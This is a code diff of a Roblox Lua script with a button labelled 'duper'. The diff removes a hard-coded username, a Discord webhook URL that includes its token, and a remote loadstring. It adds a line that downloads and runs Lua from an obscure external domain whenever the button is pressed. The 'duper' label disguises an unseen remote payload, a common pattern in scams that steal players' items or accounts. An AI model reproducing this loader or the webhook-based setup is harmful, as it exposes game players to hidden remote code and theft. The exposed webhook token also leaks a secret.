@@ -47,10 +47,7 @@ Rayfield:Notify({
 local Button = MainTab:CreateButton({
    Name = "duper",
    Callback = function()
- Username = "islamster26"
-Webhook = "https://discord.com/api/webhooks/1322917427016761395/Z9kspr_uFsYkKXaW5csKM2S9DNCPs0A5cxxc83SOZbcXgYk38EM-L49Vu3UZOLomqYPL"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/MM2"))()
+loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
    end,
 })
 
